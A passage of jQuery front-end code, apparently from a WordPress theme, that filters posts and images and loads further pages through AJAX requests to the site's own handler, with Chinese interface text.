    if (_key == 'cat')
        return true;
    var _cat_id = $('.cat-linked').data('cat')
        , _tag_id = $('.tag-linked').data('tag')
        , _orderby = $('.orderby-linked').data('orderby')
        , _post_id = $('#index_ajax_list')
        , _post_list = $('#_ajax_paged')
        , _load = $('.loading_ajax')
        , oDate = new Date().getTime();
    _load.animate({
        height: '51px',
        marginTop: '20px'
    });
    $.post(chenxing.ajax_url, {
        action: 'chenxing_catpost_ajax',
        type: 'top',
        cat: _cat_id,
        tag: _tag_id,
        orderby: _orderby
    }, function(data) {
        _nolinked.removeClass('no-linked');
        var oDate2 = new Date().getTime();
        if ((oDate2 - oDate) > 1000) {
            datet = 0;
        } else {
            datet = 1000 - (oDate2 - oDate);
        }
        setTimeout(function() {
            if (data.success == 1) {
                _post_id.html(data.post_list);
                echo.init({
                    offset: 200,
                    throttle: 50,
                    unload: false
                });
                if (data.post_all > 0) {
                    var html = '<span id="_ajax_postcatlist" data-action="chenxing_catpost_ajax" data-cat="' + _cat_id + '" data-tag="' + _tag_id + '" data-orderby="' + _orderby + '" data-num="' + data.post_all + '" data-paged="2" data-type="page">加载更多</span><div class="tit_tips">继续加载当前筛选条件相关的文章</div>';
                    _post_list.html(html).css({
                        "margin": "50px"
                    });
                    $('.pagination').hide();
                } else {
                    _post_list.html('<div class="ajax-end">—— 相关文章已全部加载 ——</div>').css({
                        "margin": "0"
                    });
                    $('.pagination').show();
                }
            } else {
                alert('服务器未找到相关数据！');
            }
            _load.animate({
                height: '0',
                marginTop: '0'
            });
        }, datet);
    }, 'json');

    return false;
});

jQuery(document).on("click", "#_ajax_postcatlist", function() {
    var _this = $(this);
    var _data = _this.data()
        , _post_id = $('#index_ajax_list')
        , _ajax_sp = $('#_ajax_paged');
    if (_this.hasClass('current2'))
        return false;
    _this.addClass("current2");
    _ajax_sp.children('.tit_tips').remove();
    _this.html('<i class="fa fa-spinner fa-pulse"></i> 加载中...');

    //开始向服务器传递数据
    jQuery.ajax({
        url: chenxing.ajax_url,
        data: _data,
        type: 'post',
        dataType: 'json',
        success: function(data) {
            if (data.success == 1) {
                var po_li = $(data.post_list).hide();
                _post_id.append(po_li);
                po_li.fadeIn(800);
                echo.init({
                    offset: 200,
                    throttle: 50,
                    unload: false
                });
                if (data.post_all > 0) {
                    var html = '<span id="_ajax_postcatlist" data-action="chenxing_catpost_ajax" data-cat="' + data.data.cat + '" data-tag="' + data.data.tag + '" data-orderby="' + data.data.orderby + '" data-num="' + data.post_all + '" data-paged="' + data.data.paged + '" data-type="page" data-id="">加载更多</span><div class="tit_tips">继续加载当前筛选条件相关的文章</div>';
                    _ajax_sp.html(html).css({
                        "margin": "50px"
                    });
                } else {
                    _ajax_sp.html('<div class="ajax-end">—— 相关文章已全部加载 ——</div>').css({
                        "margin": "0"
                    });
                    $('.pagination').toggle();
                }

            } else {
                alert('该栏目没有找到内容！');
            }
        },
        error: function(data) {
            console.log(data.responseText);
            console.log(data);
        }
    })
    return false
});

jQuery(document).on("click", "#filter-wrap-picture a", function() {
    var _this = $(this)
        , _nolinked = $('.filter-tag');

    if (_nolinked.hasClass('no-linked')) {
        window.wxc.xcConfirm('数据正在处理，即将为您呈现请稍后！', 'info');
        return false;
    }
    _nolinked.addClass('no-linked');

    if (_this.hasClass('orderby_linked'))
        return false;
    _this.parent('.fl_list').children('.orderby-linked').removeClass('orderby-linked');
    _this.addClass('orderby-linked');

    var _orderby = $('.orderby-linked').data('orderby')
        , _post_id = $('.update_area_list')
        , _post_list = $('#_ajax_paged')
        , _load = $('.loading_ajax')
        , oDate = new Date().getTime();
    _load.animate({
        height: '51px',
        marginTop: '20px'
    });
    $.post(chenxing.ajax_url, {
        action: 'chenxing_picture_ajax',
        type: 'top',
        orderby: _orderby,
        num: _nolinked.data('num')
    }, function(data) {
        _nolinked.removeClass('no-linked');
        var oDate2 = new Date().getTime();
        if ((oDate2 - oDate) > 1000) {
            datet = 0;
        } else {
            datet = 1000 - (oDate2 - oDate);
        }
        setTimeout(function() {
            if (data.success == 1) {
                _post_id.html(data.post_list);
                echo.init({
                    offset: 200,
                    throttle: 50,
                    unload: false
                });
                if (data.post_all > 0) {
                    var html = '<span id="_ajax_picturepost" data-action="chenxing_picture_ajax" data-type="page" data-num="' + data.data.pagenum + '" data-orderby="' + data.data.orderby + '" data-all="' + data.post_all + '" data-paged="' + data.data.paged + '" data-type="page">加载更多</span><div class="tit_tips">继续加载相关的内容</div>';
                    _post_list.html(html).css({
                        "margin": "50px"
                    });
                } else {
                    _post_list.html('<div class="ajax-end">—— 相关文章已全部加载 ——</div>').css({
                        "margin": "0"
                    });
                }
            } else {
                alert('服务器未找到相关数据！');
            }
            _load.animate({
                height: '0',
                marginTop: '0'
            });
        }, datet);
    }, 'json');

    return false;
});

jQuery(document).on("click", "#_ajax_picturepost", function() {
    var _this = $(this)
        , _data = _this.data()
        , _post_id = $('.update_area_list')
        , _ajax_sp = $('#_ajax_paged');
    if (_this.hasClass('no-linked'))
        return false;
    _this.addClass("no-linked");
    _ajax_sp.children('.tit_tips').remove();
    _this.html('<i class="fa fa-spinner fa-pulse"></i> 加载中...');

    //开始向服务器传递数据
    jQuery.post(chenxing.ajax_url, _data, function(data) {
        if (data.success == 1) {
            var po_li = $(data.post_list).hide();
            _post_id.append(po_li);
            po_li.fadeIn(800);
            echo.init({
                offset: 200,
                throttle: 50,
                unload: false
            });
            if (data.post_all > 0) {
                var html = '<span id="_ajax_picturepost" data-action="chenxing_picture_ajax" data-num="' + data.data.pagenum + '" data-orderby="' + data.data.orderby + '" data-all="' + data.post_all + '" data-paged="' + data.data.paged + '" data-type="page">加载更多</span><div class="tit_tips">继续加载相关的内容</div>';
                _ajax_sp.html(html).css({
                    "margin": "50px"
                });
            } else {
                _ajax_sp.html('<div class="ajax-end">—— 相关文章已全部加载 ——</div>').css({
                    "margin": "0"
                });

            }

        } else {
            alert('该栏目没有找到内容！');
        }
    }, 'json');
    return false
});

$('#js-postall').click(function() {
    var _this = $(this)
        , _body = $('#image_div')
        , _alldiv = $('#image_div_all')
        , _next = $('.next-cat')
        , _pre = $('.pre-cat');
    if (_this.hasClass('ajaxno'))
        return false;
    _this.addClass('ajaxno');
    if (_this.data('all') == 'all') {
        _this.html('<i class="iconfont" style="margin-right:3px;">&#xe64d;</i>分页浏览').data('all', 'page');
        if (_alldiv.data('ajax') != 'no') {
            _alldiv.html('<div style="text-align: center;">正在获取内容，请稍后...</div>');
        }
        _next.fadeOut();
        _pre.fadeOut();
        _body.fadeOut();
        _alldiv.show('slow', function() {
            if (_alldiv.data('ajax') != 'no') {
                $.post(chenxing.ajax_url, {
                    action: 'chenxing_imageall',
                    type: 'all',
                    post_id: chenxing.PID
                }, function(data) {
                    _alldiv.html(data);
                    _alldiv.data('ajax', 'no');
                });
            }
        });
    } else {
        _this.html('<i class="iconfont" style="margin-right:3px;">&#xe64e;</i>单页浏览').data('all', 'all');
        _alldiv.hide('slow', function() {
            _next.fadeIn();
            _pre.fadeIn();
            _body.fadeIn();
        });
    }
    _this.removeClass('ajaxno');
});
